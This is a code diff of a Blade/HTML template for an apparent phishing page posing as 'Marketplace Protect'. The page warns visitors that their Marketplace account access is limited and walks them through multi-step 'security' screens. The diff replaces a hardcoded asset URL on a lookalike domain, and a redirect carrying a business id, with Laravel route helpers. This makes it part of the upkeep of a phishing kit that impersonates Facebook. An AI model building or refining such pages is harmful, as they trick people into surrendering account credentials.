@@ -7,7 +7,7 @@
     <div class="flex min-h-screen flex-col items-center justify-center py-8">
       <div class="flex w-11/12 flex-col gap-4 rounded-lg md:w-2/5 2xl:w-1/3">
         <img
-          src="https://notification.marketplacesclientservice.store/step/assets/hero-image-2-CMe_D_F7.png"
+          src="{{asset('assets/hero-image-2-CMe_D_F7.png')}}"
           alt="Hero"
           class="rounded-t-lg" /><b class="text-2xl">Welcome To Marketplace Protect.</b>
           <p>Your account's accessibility is currently limited. We ask that higher security requirements be applied to ensure the safety of your account. This security program has been set up to fully unlock the features of Marketplace. <br /><a href="https://www.facebook.com/help/582999911881572" target="_blank" class="text-blue-500 hover:underline" rel="noreferrer">More information</a></p>        <div class="px-4">
@@ -148,7 +148,7 @@
         // Chuyển hướng tới URL mới
 
         continueButton.html(continueText).prop("disabled", false).removeClass("cursor-not-allowed bg-blue-300").addClass("bg-blue-500 hover:bg-blue-600 cursor-pointer")
-        window.location.href = rootDomain + (currentFolder ? '/' + currentFolder : '') + '/?business=278188680457&step=2';
+        window.location.href = "{{ route('home') }}/?step=2";
       }, 1000);
     });
   </script>
